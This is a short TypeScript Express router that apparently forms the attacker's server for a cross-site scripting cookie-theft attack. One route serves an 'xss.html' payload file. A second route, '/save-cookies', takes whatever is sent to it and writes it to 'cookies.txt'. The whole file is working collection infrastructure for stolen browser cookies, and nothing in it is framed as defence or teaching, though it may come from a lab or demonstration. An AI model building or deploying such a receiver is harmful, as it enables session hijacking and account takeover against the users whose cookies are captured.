import {Router, NextFunction, Request, Response} from 'express';
import * as path from 'path';
import * as fs from 'fs';
import * as bodyParser from 'body-parser';

class AppRouter {
	router: Router;

	constructor() {
		this.router = Router();
		this.init();
	}

	init() {
		
		this.router.get('/payload', (req, res) => {
		
			const assetPath = path.join(__dirname, '..', 'payload', 'xss.html');
            		res.sendFile(assetPath);
		
		});
		
		this.router.put('/save-cookies', bodyParser.text(), (req, res) => {
		
			const assetPath = path.join(__dirname, '..', 'payload', 'cookies.txt');
			fs.writeFileSync(assetPath, req.body);
			res.status(200).json({message: 'cookie saved!'});
		
		});
	
	}
    
}

export default new AppRouter().router;
